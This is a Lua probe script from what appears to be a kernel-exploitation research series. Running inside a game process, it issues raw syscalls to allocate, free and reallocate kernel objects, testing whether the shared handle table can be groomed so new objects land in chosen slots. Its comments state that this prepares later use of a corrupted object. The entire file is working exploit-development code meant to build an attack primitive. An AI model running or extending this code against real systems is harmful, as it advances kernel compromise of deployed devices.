-- CRASH_CLASS: LOW
-- PROBE 436a: the object handle table is shared, so can its slots be aimed?
--
-- 435a created evf, osem and namedobj objects in one process and the identifiers came back
-- sequential across all three families (814, 815, 816 ...), so a game process has one
-- handle table for every object type, and the number is the slot.
--
-- If a freed slot is handed back to the next allocation, then the table is aimable: create
-- N, free a chosen one, create another, and the new object lands on the slot we picked.
-- That is the difference between "an object exists somewhere" and "an object is at a place
-- I chose", which is what any later use of a corrupted object depends on.
--
-- Also prints the usable table size by allocating until one fails.

print("=== PROBE 436a: HANDLE REUSE ===")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function call(num, a1, a2, a3, a4, a5, a6)
    local sc = make_syscall(num)
    local ok, rv = pcall(function()
        return sc(uint64(a1 or 0), uint64(a2 or 0), uint64(a3 or 0), uint64(a4 or 0), uint64(a5 or 0), uint64(a6 or 0))
    end)
    if not ok then return -999 end
    if type(rv) == "table" and rv.h then
        local h, l = to_num(rv.h), to_num(rv.l)
        if h >= 2147483648 then h = h - 4294967296 end
        if l >= 2147483648 then l = l - 4294967296 end
        if h == -1 and l == -1 then return -1 end
        return h * 4294967296 + l
    end
    local n = to_num(rv)
    if n >= 9223372036854775808 then n = n - 18446744073709551616 end
    return n
end

local page = call(477, 0, 0x1000, 7, 0x1002, 0xFFFFFFFF, 0)
if page <= 0 then print("no page") return end
local i = 0
while i < 0x400 do memory.write_qword(page + i, uint64(0)); i = i + 8 end

local function mk()
    return call(557, page, 0, 0x1, 0, 0, 0)
end
local function un(h)
    return call(558, h, 0, 0, 0, 0, 0)
end
local function rd(h)
    local out = page + 0x200
    memory.write_dword(out, 0)
    local r = call(557, 0, 0, 0x1, h, out, 0)
    return r
end

local first = {}
local k = 1
while k <= 8 do first[k] = mk(); k = k + 1 end
print(string.format("[A] 8 created: %s", table.concat(first, " ")))

-- free the four in the middle, then create four more
local freedorder = {4, 3, 6, 5}
local s = ""
k = 1
while k <= 4 do
    local h = first[freedorder[k]]
    s = s .. string.format(" free(%d)=%d", h, un(h))
    k = k + 1
end
print("[B]" .. s)

local again = {}
k = 1
while k <= 4 do again[k] = mk(); k = k + 1 end
print(string.format("[C] 4 created: %s", table.concat(again, " ")))

-- a used handle versus a freed handle through the read path
local readUsed = rd(first[1])
local readFreed = rd(first[3])
local readNew = rd(again[1])
print(string.format("[D] read used=%d freed=%d new=%d", readUsed, readFreed, readNew))

-- table size: allocate until it fails
local n, cap = 0, -1
k = 1
while k <= 1200 do
    local h = mk()
    if h < 0 then cap = n; break end
    n = n + 1
    k = k + 1
end
print(string.format("[E] allocated %d more before %s", n, (cap >= 0) and "refusal" or "the cap"))

print("=== 436a DONE ===")
